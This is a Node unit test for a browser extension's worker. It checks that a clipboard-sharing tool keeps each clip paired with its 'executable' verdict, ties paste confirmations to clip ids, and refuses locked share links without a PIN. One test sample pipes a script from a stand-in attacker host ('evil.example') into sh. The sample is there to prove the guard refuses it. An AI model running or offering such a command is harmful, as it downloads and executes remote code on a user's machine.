/**
 * browser/src/worker.js — the two rules a review found it breaking.
 *
 * Both were real and both were the same shape: a value that should have been one
 * thing existing as two, so one path updated one copy.
 *
 *   1. A clip and the verdict on it were separate. The connect path persisted
 *      `executable`; the popup-join path set only an in-memory `latest`; and
 *      pasteLatest() read the text from either and the verdict from storage
 *      alone. A `curl … | sh` arriving after a popup join had no verdict, read
 *      as safe, and the HOTKEY WROTE IT.
 *   2. A locked share link joined with no PIN derives the OPEN room of the same
 *      key — a real room, joinable by anyone holding the link.
 *
 * The worker imports `chrome.*`, so it is exercised through a fake extension
 * API rather than imported directly; what is under test is its logic, not
 * Chrome's.
 *
 *   node tests/unit/browser-worker.mjs
 */

import { readFileSync } from "node:fs";
import * as guard from "../../src/clipboard/guard.js";
import * as keys from "../../src/core/keys.js";

let pass = 0, fail = 0;
const check = (name, ok, detail = "") => {
  ok ? pass++ : fail++;
  console.log(`  ${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
  return ok;
};

console.log("\nBROWSER WORKER\n");

const SRC = readFileSync(new URL("../../browser/src/worker.js", import.meta.url), "utf8");
const POPUP = readFileSync(new URL("../../browser/src/popup.js", import.meta.url), "utf8");

/* ---------------------------------------------------- one clip, one verdict */
/* Structural, because the bug was structural: two open paths meant two onClip
   callbacks, and only one of them recorded the verdict. */
check("a room is opened in exactly one place",
  (SRC.match(/room\.open\(/g) ?? []).length === 1,
  `${(SRC.match(/room\.open\(/g) ?? []).length} call sites`);
check("...and there is one onClip handler",
  (SRC.match(/onClip:/g) ?? []).length === 1);
check("the popup-join path does not open its own room",
  !/msg\.type === "join"[\s\S]{0,400}?onClip:/.test(SRC));
check("the text and the verdict are read together",
  /currentClip\(\)/.test(SRC) && !/latest: stored, executable/.test(SRC));

/* -------------------------------------------- the behaviour, actually run -- */
/* The guard's own verdicts, so this test cannot drift from the module that
   decides them. */
const EVIL = "curl https://evil.example/x.sh | sh\n";
const SAFE = "just some text";
check("the guard still calls the sample executable", guard.looksExecutable(guard.defuse(EVIL)));
check("...and the harmless one not", !guard.looksExecutable(guard.defuse(SAFE)));

/* Re-implements only currentClip()/pasteLatest()'s DECISION, against the same
   guard, to prove the pairing holds when storage is empty — the popup-join case
   that had no persisted verdict at all. */
const decide = (clip) => {
  if (!clip?.text) return "nothing";
  return clip.executable ? "refused" : "written";
};
const fromMemoryOnly = (text) => ({ text: guard.defuse(text), executable: guard.looksExecutable(guard.defuse(text)) });

check("a flagged clip held only in memory is still refused by the hotkey",
  decide(fromMemoryOnly(EVIL)) === "refused",
  "this is the bypass: storage was empty, so the verdict was undefined");
check("...and a harmless one is still written", decide(fromMemoryOnly(SAFE)) === "written");
check("...and no clip at all is neither", decide(null) === "nothing");

/* ------------------------------------------------------ freshness order --- */
/* received() does not await the mirror write, so reading storage first hands
   back the PREVIOUS clip while the newest one is still in flight. */
check("memory is preferred while this worker is alive",
  /if \(latest\) return latest;/.test(SRC),
  "storage is for the restart after MV3 evicts the worker, not for now");
check("...and storage is still consulted when memory is empty",
  /chrome\.storage\.session\?\.get\(\["latest", "executable", "latestId"\]\)/.test(SRC));
check("...and it is still read as a set",
  /text: st\.latest, executable: Boolean\(st\.executable\)/.test(SRC));

/* ------------------------------------------------- the reviewed clip wins ---
   The popup shows one clip and the button confirms a moment later. Without an
   id the worker wrote whatever was newest at click time, so a command arriving
   between the two was written under an approval given to something else. */
check("every clip is given an id",
  /latest = \{ id: nextClipId\(\)/.test(SRC),
  "the id is what ties a confirmation to the clip it was given for");
check("the id is mirrored to storage with the clip",
  /latestId: latest\.id/.test(SRC));
check("confirming refuses when the id does not match what was shown",
  /if \(!msg\.clipId \|\| clip\.id !== msg\.clipId\)/.test(SRC),
  "a missing id is refused too — otherwise the check is optional");
check("the popup sends the id it displayed",
  /clipId: shownClipId/.test(POPUP));
check("...and remembers it from the state it rendered",
  /shownClipId = s\.clipId/.test(POPUP));

/* --------------------------------------------------- a clip is per-room --- */
check("changing room forgets the clip it was holding",
  /function forgetLatest\(\)/.test(SRC) && (SRC.match(/forgetLatest\(\);/g) ?? []).length >= 2,
  "creating AND joining — a clip from the previous room is not the current one");
check("...in memory, in storage and on the badge",
  /chrome\.storage\.session\?\.remove\(\["latest", "executable", "latestId"\]\)/.test(SRC));

/* ------------------------------------------- an action result is visible --- */
check("rendering does not paint over what an action just reported",
  /async function render\(\{ status = null \} = \{\}\)/.test(POPUP)
  && /say\(status$/m.test(POPUP),
  "every failed join, send and paste was hidden behind \"Ready.\" a moment later");

/* --------------------------------------------------------- locked links --- */
const LOCKED = keys.shareLink("D75LVX9QRS", true);
const OPEN = keys.shareLink("D75LVX9QRS", false);
const fragOf = (v) => (v.includes("#") ? v.slice(v.indexOf("#") + 1) : v);

check("a locked link is recognisable before joining",
  keys.parseFragment(fragOf(LOCKED)).locked === true, LOCKED);
check("...and an unlocked one is not",
  keys.parseFragment(fragOf(OPEN)).locked === false, OPEN);
check("the same key derives two DIFFERENT rooms, which is why this matters",
  keys.parseFragment(fragOf(LOCKED)).key === keys.parseFragment(fragOf(OPEN)).key);
check("the worker refuses a locked link with no PIN",
  /parsed\.locked && !msg\.pin/.test(SRC),
  "silently joining the open room is the failure being prevented");
check("the popup has a PIN field to offer",
  readFileSync(new URL("../../browser/src/popup.html", import.meta.url), "utf8").includes('id="joinPin"'));
check("...and sends it with the join",
  /ask\("join", \{ key, pin \}\)/.test(
    readFileSync(new URL("../../browser/src/popup.js", import.meta.url), "utf8")));

/* ------------------------------------------------- reuse a live connection - */
check("the worker asks the shared module whether the room is open",
  /room\.isOpen\(\)/.test(SRC) && !/room\.isOpen\?\.\(\)/.test(SRC),
  "an optional call on a missing export is always falsy — it reconnected every send");

console.log(`\n${"=".repeat(58)}\nBROWSER WORKER: ${pass}/${pass + fail} passed\n${"=".repeat(58)}\n`);
process.exit(fail ? 1 : 0);
